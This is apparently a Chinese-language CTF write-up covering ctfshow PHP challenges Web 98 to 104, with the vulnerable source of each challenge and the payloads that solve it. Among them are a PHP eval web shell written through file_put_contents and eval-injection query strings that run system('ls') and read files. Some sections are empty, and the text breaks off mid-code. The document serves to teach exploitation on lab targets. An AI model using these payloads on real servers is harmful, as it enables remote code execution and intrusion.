<h2 id="1-10-Web-98-—-三目运算符、变量覆盖"><a href="#1-10-Web-98-—-三目运算符、变量覆盖" class="headerlink" title="1.10 Web 98 — 三目运算符、变量覆盖"></a>1.10 Web 98 — 三目运算符、变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get传参：?flag=1post传参：?HTTP_FLAG=flag</span><br></pre></td></tr></table></figure>

<h2 id="1-11-Web-99-—-file-put-contents"><a href="#1-11-Web-99-—-file-put-contents" class="headerlink" title="1.11 Web 99 — file_put_contents"></a>1.11 Web 99 — file_put_contents</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;     array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));&#125;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/17/fi76py2toXNEksO.png" alt="image-20210717144542465"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 <span class="literal">true</span> 时，in_array之中的比较与 === 一致<span class="variable">$allow</span> = array(1,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>);var_dump(in_array(<span class="string">&#x27;1.php&#x27;</span>,<span class="variable">$allow</span>));<span class="comment">#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 /1.php</p>
<p><img src="https://i.loli.net/2021/08/05/M8ypxAwW7jNsoP6.png" alt="image-20210805214445932"></p>
<h2 id="1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”"><a href="#1-12-Web-100-—-eval-“-v2-‘ctfshow’-v3”" class="headerlink" title="1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);"></a>1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);<span class="comment">//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;   &#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>var_dump(<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>);	<span class="comment">// falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a);  // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>;var_dump(<span class="variable">$a</span>);  // trueif(<span class="variable">$a</span> === <span class="literal">true</span> and <span class="literal">false</span> and <span class="literal">false</span>)&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	//不输出&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$a</span>=<span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>;var_dump(<span class="variable">$a</span>); <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="literal">false</span> and <span class="literal">true</span> and <span class="literal">true</span>)&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	&#125;//bool(<span class="literal">false</span>) 111</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">if</span>(<span class="variable">$v0</span>)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (<span class="string">&#x27;ctfshow&#x27;</span>) 注释掉4. 注意，v3 一定要写上 ;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>构造成下面的感觉</p>
<p><img src="https://i.loli.net/2021/08/05/GTRs27cIVn3MmHB.png" alt="image-20210805221256350"></p>
<p>查 ctfshow.php 试试</p>
<p><img src="https://i.loli.net/2021/08/05/xAJrKWGiBOjhmTu.png" alt="image-20210805221505214"></p>
<p>其中，<code>0x2d  </code> 是 <code>-</code></p>
<h2 id="1-13-Web-101-—-ReflectionClass-关于一个类的反射"><a href="#1-13-Web-101-—-ReflectionClass-关于一个类的反射" class="headerlink" title="1.13 Web 101 — ReflectionClass 关于一个类的反射"></a>1.13 Web 101 — ReflectionClass 关于一个类的反射</h2><p><a target="_blank" rel="noopener" href="http://www.thinkphp.cn/code/4863.html">http://www.thinkphp.cn/code/4863.html</a></p>
<p><img src="https://i.loli.net/2021/08/05/WCA6wXcS4Bxt89l.png" alt="image-20210805224208153"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修补100题非预期,替换0x2d</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);include(<span class="string">&quot;ctfshow.php&quot;</span>);//flag <span class="keyword">in</span> class ctfshow;<span class="variable">$ctfshow</span> = new ctfshow();<span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;            <span class="built_in">eval</span>(<span class="string">&quot;<span class="variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="variable">$v3</span>&quot;</span>);        &#125;    &#125;  &#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>上面的 v2 构造的符号 被过滤</p>
<p><strong>构造 eval(echo new ReflectionClass(‘ctfshow’));</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h2 id="1-14-Web-102"><a href="#1-14-Web-102" class="headerlink" title="1.14 Web 102"></a>1.14 Web 102</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];<span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];<span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];<span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,2);    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);    <span class="built_in">echo</span> <span class="variable">$str</span>;    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);&#125;<span class="keyword">else</span>&#123;    die(<span class="string">&#x27;hacker&#x27;</span>);&#125;?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="1-15-Web-103"><a href="#1-15-Web-103" class="headerlink" title="1.15 Web 103"></a>1.15 Web 103</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="1-16-Web-104-—-shal-数组-绕过"><a href="#1-16-Web-104-—-shal-数组-绕过" class="headerlink" title="1.16 Web 104 — shal() 数组 [ ] 绕过"></a>1.16 Web 104 — shal() 数组 [ ] 绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换个姿势</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;    <span class="variable">$v1</span> = <span class="variable">$_POS